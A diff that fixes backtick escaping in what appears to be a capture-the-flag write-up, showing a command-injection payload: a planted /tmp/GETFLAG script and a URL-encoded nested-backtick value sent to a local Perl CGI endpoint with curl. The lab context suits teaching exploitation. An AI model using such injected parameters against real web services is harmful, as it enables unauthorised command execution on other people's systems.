@@ -16,11 +16,11 @@ printf '#!/bin/sh\ngetflag > /tmp/flag\n' > /tmp/GETFLAG
 chmod +x /tmp/GETFLAG
 ```
 
-We will then be trying to run the following: ``\`egrep "^\`/*/GETFLAG\`" /tmp/xd 2>&1\` ``
+We will then be trying to run the following: `` `egrep "^`/*/GETFLAG`" /tmp/xd 2>&1` ``   
 In such a case of nested backticked shellscripts, perl seems to first execute the inner shellscript, as referenced [here](http://www.novosial.org/perl/backticks/index.html).  
 This will cause sh to look for an executable called "GETFLAG" in every folder of `/`, and to execute the first it finds, which will hopefully be our script.
 
-So we will just pass the string ``\`/\*/GETFLAG\` `` as a an x parameter to the CGI endpoint, after having URL-encoded it
+So we will just pass the string `` `/*/GETFLAG` `` as a an x parameter to the CGI endpoint, after having URL-encoded it
 ```sh
 curl localhost:4646?x="%60%2F%2A%2FGETFLAG%60"
 ```
